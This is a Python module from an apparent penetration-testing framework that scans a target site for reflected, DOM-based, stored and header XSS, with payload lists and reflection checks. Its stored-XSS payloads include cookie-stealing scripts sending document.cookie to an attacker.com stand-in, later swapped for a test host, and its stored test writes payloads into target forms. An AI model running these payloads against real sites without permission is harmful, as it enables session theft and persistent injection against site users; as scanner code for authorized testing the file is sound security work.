#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Cross-Site Scripting (XSS) Scanner Module for PIN0CCHI0

This module performs specialized XSS testing using various techniques
to identify and exploit XSS vulnerabilities in web applications.
"""

import os
import json
import re
import time
import logging
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from html import escape

from core.base_module import VulnTestingModule
from core.utils import make_request, run_command, ensure_dir_exists

# Configure logger
logger = logging.getLogger('pin0cchi0.vuln_testing.xss_scanner')

class XSSScanner(VulnTestingModule):
    """Cross-Site Scripting (XSS) Scanner module for PIN0CCHI0."""
    
    def __init__(self):
        """Initialize the XSS Scanner module."""
        super().__init__()
        self.name = "XSS Scanner"
        self.description = "Tests for Cross-Site Scripting vulnerabilities in web applications"
        self.category = "vuln_testing"
        self.author = "PIN0CCHI0 Team"
        self.version = "0.1.0"
        self.references = [
            "https://owasp.org/www-community/attacks/xss/",
            "https://portswigger.net/web-security/cross-site-scripting",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        ]
        
        # Initialize results storage
        self.vulnerabilities = []
        self.tested_endpoints = set()
        self.confirmed_vulnerabilities = []
        
        # XSS payloads
        self.reflected_xss_payloads = [
            '<script>alert("PIN0CCHI0")</script>',
            '"><script>alert("PIN0CCHI0")</script>',
            '\'"><script>alert("PIN0CCHI0")</script>',
            '<img src=x onerror=alert("PIN0CCHI0")>',
            '"><img src=x onerror=alert("PIN0CCHI0")>',
            '\'"><img src=x onerror=alert("PIN0CCHI0")>',
            '<body onload=alert("PIN0CCHI0")>',
            '" onmouseover=alert("PIN0CCHI0") "',
            '\'onmouseover=alert("PIN0CCHI0")//'
        ]
        
        self.dom_xss_payloads = [
            '\'"><img src=x onerror=alert(document.domain)>',
            '\'"><svg onload=alert(document.domain)>',
            '\'"><iframe onload=alert(document.domain)></iframe>',
            '\'"><details open ontoggle=alert(document.domain)>',
            '\'"><div onmouseover=alert(document.domain)>hover me</div>',
            '\'"><a href=javascript:alert(document.domain)>click me</a>',
            '\'"><select onchange=alert(document.domain)><option>1</option><option>2</option></select>',
            '\'"><marquee onstart=alert(document.domain)>test</marquee>',
            '\'"><isindex onmouseover="alert(document.domain)">'            
        ]
        
        self.stored_xss_payloads = [
            '<script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>',
            '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
            '<svg onload="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
            '<script>new Image().src="https://attacker.com/steal?cookie="+document.cookie;</script>',
            '<script>navigator.sendBeacon(\'https://attacker.com/steal\', document.cookie)</script>'
        ]
        
        # For testing purposes, replace attacker.com with a benign value
        self.stored_xss_payloads = [p.replace('attacker.com', 'pin0cchi0-test.local') for p in self.stored_xss_payloads]
        
        # XSS detection patterns
        self.xss_detection_markers = [
            'PIN0CCHI0',
            'alert(',
            'onerror=',
            'onload=',
            'onmouseover=',
            'javascript:',
            '<script>',
            '<img',
            '<svg',
            '<iframe',
            '<details',
            '<div',
            '<a',
            '<select',
            '<marquee',
            '<isindex'
        ]
        
    def run(self, target, config=None):
        """Run the XSS scanner on the target.
        
        Args:
            target (str): The target URL to test
            config (dict): Configuration options for the test
            
        Returns:
            dict: Test results and identified vulnerabilities
        """
        logger.info(f"Starting XSS scanning on {target}")
        
        if config is None:
            config = {}
        
        # Ensure target is properly formatted
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create results directory
        timestamp = int(time.time())
        results_dir = os.path.join(os.getcwd(), 'results', 'vuln_testing', f"xss_scan_{timestamp}")
        ensure_dir_exists(results_dir)
        
        # Get configuration options
        max_threads = config.get('xss_scanner', {}).get('max_threads', 5)
        test_forms = config.get('xss_scanner', {}).get('test_forms', True)
        test_headers = config.get('xss_scanner', {}).get('test_headers', False)
        test_dom = config.get('xss_scanner', {}).get('test_dom', True)
        test_stored = config.get('xss_scanner', {}).get('test_stored', True)
        
        # Discover endpoints to test
        endpoints = self._discover_endpoints(target, test_forms)
        
        # Test discovered endpoints for XSS
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Test URL parameters for reflected XSS
            for endpoint in endpoints:
                if endpoint['url'] not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint['url'])
                    executor.submit(self._test_endpoint_for_reflected_xss, endpoint, target)
        
        # Test for DOM-based XSS if enabled
        if test_dom:
            self._test_dom_xss(target, endpoints)
        
        # Test for stored XSS if enabled
        if test_stored:
            self._test_stored_xss(target, endpoints)
        
        # Test HTTP headers if enabled
        if test_headers:
            self._test_headers(target)
        
        # Consolidate and deduplicate results
        self._consolidate_results()
        
        # Save results to file
        results_file = os.path.join(results_dir, 'xss_results.json')
        with open(results_file, 'w') as f:
            json.dump({
                'target': target,
                'timestamp': timestamp,
                'vulnerabilities': self.vulnerabilities,
                'scan_summary': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'total_endpoints_tested': len(self.tested_endpoints),
                    'confirmed_vulnerabilities': len(self.confirmed_vulnerabilities)
                }
            }, f, indent=2)
        
        logger.info(f"XSS scanning completed. Found {len(self.vulnerabilities)} potential vulnerabilities.")
        logger.info(f"Results saved to {results_file}")
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'results_file': results_file
        }
    
    def _discover_endpoints(self, target, test_forms=True):
        """Discover endpoints on the target for testing."""
        logger.info(f"Discovering endpoints on {target}")
        
        endpoints = []
        
        # Add the main target URL
        endpoints.append({'url': target, 'type': 'url'})
        
        # Get the main page
        response = make_request(target)
        
        if not response['success']:
            logger.warning(f"Failed to retrieve main page for endpoint discovery: {response.get('error', 'Unknown error')}")
            return endpoints
        
        html = response['text']
        
        # Find all links with query parameters
        link_pattern = re.compile(r'href=["\']([^"\'>]*\?[^"\'>]*)["\']', re.IGNORECASE)
        links = link_pattern.findall(html)
        
        for link in links:
            # Handle relative URLs
            if not link.startswith(('http://', 'https://', '//')): 
                link = urllib.parse.urljoin(target, link)
            elif link.startswith('//'):
                link = 'https:' + link if target.startswith('https') else 'http:' + link
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(link).netloc == urllib.parse.urlparse(target).netloc:
                endpoints.append({'url': link, 'type': 'link'})
        
        # Find all forms if enabled
        if test_forms:
            form_pattern = re.compile(r'<form[^>]*action=["\']([^"\'>]*)["\'][^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
            form_matches = form_pattern.findall(html)
            
            for action, form_content in form_matches:
                # Handle empty action (submits to current page)
                if not action:
                    action = urllib.parse.urlparse(target).path or '/'
                
                # Handle relative URLs
                if not action.startswith(('http://', 'https://', '//')): 
                    action = urllib.parse.urljoin(target, action)
                elif action.startswith('//'):
                    action = 'https:' + action if target.startswith('https') else 'http:' + action
                
                # Only include endpoints from the same domain
                if urllib.parse.urlparse(action).netloc == urllib.parse.urlparse(target).netloc:
                    # Find input fields
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\'>]+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_content)
                    
                    # Add form endpoint with input fields
                    endpoints.append({
                        'url': action,
                        'type': 'form',
                        'method': self._get_form_method(form_content),
                        'inputs': inputs
                    })
        
        # Also look for JavaScript event handlers that might be vulnerable to DOM XSS
        js_event_pattern = re.compile(r'on\w+=["\']([^"\'>]+)["\']', re.IGNORECASE)
        js_events = js_event_pattern.findall(html)
        
        if js_events:
            endpoints.append({
                'url': target,
                'type': 'dom',
                'js_events': js_events
            })
        
        # Look for JavaScript that might handle URL parameters
        js_url_pattern = re.compile(r'(location\.search|location\.hash|document\.URL|document\.documentURI|document\.location)', re.IGNORECASE)
        js_url_handlers = js_url_pattern.findall(html)
        
        if js_url_handlers:
            endpoints.append({
                'url': target,
                'type': 'dom_url',
                'js_handlers': js_url_handlers
            })
        
        # Deduplicate endpoints
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url = endpoint['url']
            # Remove fragments
            url = url.split('#')[0]
            
            # Create a unique key based on URL and type
            key = f"{url}|{endpoint['type']}"
            
            if key not in seen_urls:
                seen_urls.add(key)
                endpoint['url'] = url
                unique_endpoints.append(endpoint)
        
        logger.info(f"Discovered {len(unique_endpoints)} unique endpoints")
        return unique_endpoints
    
    def _get_form_method(self, form_content):
        """Extract the HTTP method from a form."""
        method_match = re.search(r'method=["\']([^"\'>]+)["\']', form_content, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'  # Default to GET if method not specified
    
    def _test_endpoint_for_reflected_xss(self, endpoint, target):
        """Test an endpoint for reflected XSS vulnerabilities."""
        url = endpoint['url']
        logger.info(f"Testing endpoint for reflected XSS: {url}")
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        query = parsed_url.query
        
        # If URL has query parameters, test each parameter
        if query:
            params = query.split('&')
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    # Test reflected XSS
                    self._test_reflected_xss(url, param_name, parsed_url)
        
        # If endpoint is a form, test form inputs
        if endpoint['type'] == 'form' and 'inputs' in endpoint:
            for input_name in endpoint['inputs']:
                # For GET forms, parameters are in the URL
                if endpoint['method'] == 'GET':
                    # Test reflected XSS
                    self._test_reflected_xss(url, input_name, parsed_url)
                
                # For POST forms, we need to send POST requests
                else:  # POST, PUT, etc.
                    # Test reflected XSS with POST
                    self._test_reflected_xss_post(url, input_name)
    
    def _test_reflected_xss(self, url, param_name, parsed_url):
        """Test for reflected XSS in a URL parameter."""
        path = parsed_url.path
        query = parsed_url.query
        
        # Test each payload
        for payload in self.reflected_xss_payloads:
            # Replace parameter value with payload
            new_query = self._replace_param_value(query, param_name, payload)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
            
            # Send request with payload
            response = make_request(test_url)
            
            if not response['success']:
                continue
            
            # Check if payload is reflected in the response
            if self._is_xss_payload_reflected(payload, response['text']):
                vuln = {
                    'name': "Reflected Cross-Site Scripting (XSS)",
                    'severity': "high",
                    'description': "A reflected XSS vulnerability was found, which could allow attackers to execute arbitrary JavaScript in users' browsers.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Payload was reflected in the response",
                    'type': 'reflected_xss',
                    'remediation': "Implement proper input validation and output encoding"
                }
                self.vulnerabilities.append(vuln)
                self.confirmed_vulnerabilities.append(vuln)
                logger.info(f"Found reflected XSS vulnerability in parameter {param_name} on {url}")
                return  # Found a vulnerability, no need to test more payloads
    
    def _test_reflected_xss_post(self, url, param_name):
        """Test for reflected XSS in a POST parameter."""
        # Test each payload
        for payload in self.reflected_xss_payloads:
            # Send request with payload
            response = make_request(url, method='POST', data={param_name: payload})
            
            if not response['success']:
                continue
            
            # Check if payload is reflected in the response
            if self._is_xss_payload_reflected(payload, response['text']):
                vuln = {
                    'name': "Reflected Cross-Site Scripting (XSS) in POST parameter",
                    'severity': "high",
                    'description': "A reflected XSS vulnerability was found in a POST parameter, which could allow attackers to execute arbitrary JavaScript in users' browsers.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Payload was reflected in the response",
                    'type': 'reflected_xss_post',
                    'remediation': "Implement proper input validation and output encoding"
                }
                self.vulnerabilities.append(vuln)
                self.confirmed_vulnerabilities.append(vuln)
                logger.info(f"Found reflected XSS vulnerability in POST parameter {param_name} on {url}")
                return  # Found a vulnerability, no need to test more payloads
    
    def _test_dom_xss(self, target, endpoints):
        """Test for DOM-based XSS vulnerabilities."""
        logger.info(f"Testing for DOM-based XSS on {target}")
        
        # Find endpoints that might be vulnerable to DOM XSS
        dom_endpoints = [e for e in endpoints if e['type'] in ('dom', 'dom_url')]
        
        for endpoint in dom_endpoints:
            url = endpoint['url']
            
            # For DOM XSS, we often need to test with URL fragments
            for payload in self.dom_xss_payloads:
                # Test with URL fragment
                test_url = f"{url}#xss={payload}"
                response = make_request(test_url)
                
                if not response['success']:
                    continue
                
                # For DOM XSS, we need to check if the payload is executed
                # This is difficult to detect automatically without browser automation
                # Here we're just checking if the payload is present in the DOM
                if self._is_xss_payload_reflected(payload, response['text']):
                    vuln = {
                        'name': "Potential DOM-based Cross-Site Scripting (XSS)",
                        'severity': "high",
                        'description': "A potential DOM-based XSS vulnerability was found, which could allow attackers to execute arbitrary JavaScript in users' browsers.",
                        'location': url,
                        'parameter': 'URL fragment',
                        'payload': payload,
                        'evidence': f"Payload was found in the DOM",
                        'type': 'dom_xss',
                        'remediation': "Implement proper input validation and use safe DOM manipulation methods"
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found potential DOM-based XSS vulnerability on {url}")
                    break  # Found a vulnerability, no need to test more payloads
                
                # Also test with query parameters for DOM XSS
                test_url = f"{url}?xss={urllib.parse.quote_plus(payload)}"
                response = make_request(test_url)
                
                if not response['success']:
                    continue
                
                if self._is_xss_payload_reflected(payload, response['text']):
                    vuln = {
                        'name': "Potential DOM-based Cross-Site Scripting (XSS)",
                        'severity': "high",
                        'description': "A potential DOM-based XSS vulnerability was found, which could allow attackers to execute arbitrary JavaScript in users' browsers.",
                        'location': url,
                        'parameter': 'xss',
                        'payload': payload,
                        'evidence': f"Payload was found in the DOM",
                        'type': 'dom_xss',
                        'remediation': "Implement proper input validation and use safe DOM manipulation methods"
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found potential DOM-based XSS vulnerability on {url}")
                    break  # Found a vulnerability, no need to test more payloads
    
    def _test_stored_xss(self, target, endpoints):
        """Test for stored XSS vulnerabilities."""
        logger.info(f"Testing for stored XSS on {target}")
        
        # Find forms that might be used to submit content
        form_endpoints = [e for e in endpoints if e['type'] == 'form']
        
        for endpoint in form_endpoints:
            url = endpoint['url']
            method = endpoint.get('method', 'GET')
            inputs = endpoint.get('inputs', [])
            
            # Skip forms with no inputs
            if not inputs:
                continue
            
            # Look for forms that might store user input
            potential_storage_inputs = []
            for input_name in inputs:
                # Look for inputs that might store content
                if any(keyword in input_name.lower() for keyword in ['comment', 'message', 'post', 'content', 'text', 'body', 'description']):
                    potential_storage_inputs.append(input_name)
            
            # If no potential storage inputs found, try the first input
            if not potential_storage_inputs and inputs:
                potential_storage_inputs = [inputs[0]]
            
            # Test each potential storage input
            for input_name in potential_storage_inputs:
                # Try each stored XSS payload
                for payload in self.stored_xss_payloads:
                    # Submit the form with the payload
                    if method == 'GET':
                        # For GET forms, add the payload to the URL
                        parsed_url = urllib.parse.urlparse(url)
                        query = parsed_url.query
                        
                        # Add or replace the parameter
                        if query:
                            new_query = self._replace_param_value(query, input_name, payload)
                        else:
                            new_query = f"{input_name}={urllib.parse.quote_plus(payload)}"
                        
                        submit_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                        response = make_request(submit_url)
                    else:
                        # For POST forms, send the payload in the request body
                        response = make_request(url, method='POST', data={input_name: payload})
                    
                    if not response['success']:
                        continue
                    
                    # Now check if the payload is stored by visiting the page again
                    check_response = make_request(url)
                    
                    if not check_response['success']:
                        continue
                    
                    # Check if the payload is in the response
                    if self._is_xss_payload_reflected(payload, check_response['text']):
                        vuln = {
                            'name': "Potential Stored Cross-Site Scripting (XSS)",
                            'severity': "high",
                            'description': "A potential stored XSS vulnerability was found, which could allow attackers to store malicious JavaScript that executes in other users' browsers.",
                            'location': url,
                            'parameter': input_name,
                            'payload': payload,
                            'evidence': f"Payload was found in the response after submission",
                            'type': 'stored_xss',
                            'remediation': "Implement proper input validation, output encoding, and consider Content Security Policy"
                        }
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found potential stored XSS vulnerability in {input_name} on {url}")
                        break  # Found a vulnerability, no need to test more payloads
    
    def _test_headers(self, target):
        """Test HTTP headers for XSS vulnerabilities."""
        logger.info(f"Testing HTTP headers for XSS on {target}")
        
        # Headers to test
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        # Test each header with a subset of payloads
        for header in headers_to_test:
            for payload in self.reflected_xss_payloads[:3]:  # Use a subset of payloads for headers
                custom_headers = {header: payload}
                response = make_request(target, headers=custom_headers)
                
                if not response['success']:
                    continue
                
                # Check if the payload is reflected in the response
                if self._is_xss_payload_reflected(payload, response['text']):
                    vuln = {
                        'name': f"Reflected XSS in {header} header",
                        'severity': "high",
                        'description': f"A reflected XSS vulnerability was found in the {header} HTTP header.",
                        'location': target,
                        'parameter': header,
                        'payload': payload,
                        'evidence': f"Payload in {header} header was reflected in the response",
                        'type': 'header_xss',
                        'remediation': "Implement proper validation and encoding of HTTP headers used in the response"
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found XSS vulnerability in {header} header on {target}")
                    break  # Found a vulnerability, no need to test more payloads
    
    def _is_xss_payload_reflected(self, payload, response_text):
        """Check if an XSS payload is reflected in the response."""
        # First, check for exact payload reflection
        if payload in response_text:
            return True
        
        # Check for URL-encoded payload reflection
        encoded_payload = urllib.parse.quote_plus(payload)
        if encoded_payload in response_text:
            return True
        
        # Check for partially HTML-encoded payload reflection
        html_encoded_payload = escape(payload)
        if html_encoded_payload in response_text:
            return False  # If fully HTML encoded, it's not vulnerable
        
        # Check for specific XSS markers
        for marker in self.xss_detection_markers:
            if marker in payload and marker in response_text:
                # Found a marker, but need to check context
                # This is a simplified check and might have false positives
                return True
        
        return False
    
    def _replace_param_value(self, query, param_name, new_value):
        """Replace a parameter value in a query string."""
        params = query.split('&')
        new_params = []
        
        for param in params:
            if '=' in param:
                name, value = param.split('=', 1)
                if name == param_name:
                    new_params.append(f"{name}={urllib.parse.quote_plus(new_value)}")
                else:
                    new_params.append(param)
            else:
                new_params.append(param)
        
        return '&'.join(new_params)
    
    def _consolidate_results(self):
        """Consolidate and deduplicate vulnerability findings."""
        logger.info("Consolidating XSS findings")
        
        # Deduplicate vulnerabilities
        unique_vulns = []
        seen_vulns = set()
        
        for vuln in self.vulnerabilities:
            # Create a key for deduplication
            key = f"{vuln['name']}|{vuln['location']}|{vuln.get('parameter', '')}"
            
            if key not in seen_vulns:
                seen_vulns.add(key)
                unique_vulns.append(vuln)
        
        # Update vulnerabilities list
        self.vulnerabilities = unique_vulns
        
        # Sort by severity
        severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 5))
        
        logger.info(f"Consolidated to {len(self.vulnerabilities)} unique vulnerabilities")